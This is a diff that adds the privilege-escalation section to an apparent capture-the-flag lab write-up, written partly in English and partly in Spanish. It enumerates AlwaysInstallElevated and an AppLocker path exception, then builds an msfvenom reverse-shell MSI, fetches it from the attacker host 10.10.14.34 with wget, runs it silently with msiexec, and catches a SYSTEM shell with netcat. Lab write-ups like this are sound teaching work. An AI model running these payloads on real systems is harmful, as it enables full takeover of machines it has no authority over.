@@ -84,3 +84,49 @@ love\phoebe
 C:\Users\Phoebe\Desktop>type user.txt
 type user.txt
 b46f133cc889e4396ffe345a3ebe78b0
+
+
+[+]PRIVILAGE ESCALATION[+]
+By enumerating common windows registry keys, we find AlwaysInstallElevated is set to be enabled.
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+Podemos aprovechar esta vulnerabilidad y ejecutar nuestra carga útil de Windows Installer (.msi). Sin embargo, si tratamos de ejecutar
+la carga útil resultará ser un fracaso.
+Luego de una enumeración adicional, observamos que la política de bloqueo de aplicaciones está configurada y solo Phoebe y
+Los usuarios administradores pueden instalar archivos MSI en un directorio específico.
+
+C:\Users>powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users> get-applockerpolicy -effective | select -expandproperty rulecollections
+PathExceptions      : {%OSDRIVE%\Administration\*}
+PS C:\> cd Administration
+
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.34 LPORT=5555 -f msi -o reverse.msi
+sudo python3 -m http.server 80
+
+
+PS C:\Administration> wget http://10.10.14.34/reverse.msi -o reverse.msi
+wget http://10.10.14.34/reverse.msi -o reverse.msi
+PS C:\Administration> msiexec /quiet /i reverse.msi
+msiexec /quiet /i reverse.msi
+
+
+
+sudo nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.34] from (UNKNOWN) [10.10.10.239] 60745
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+whoami
+nt authority\system
+
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+27be8a092531b17c52627e2c05299ced
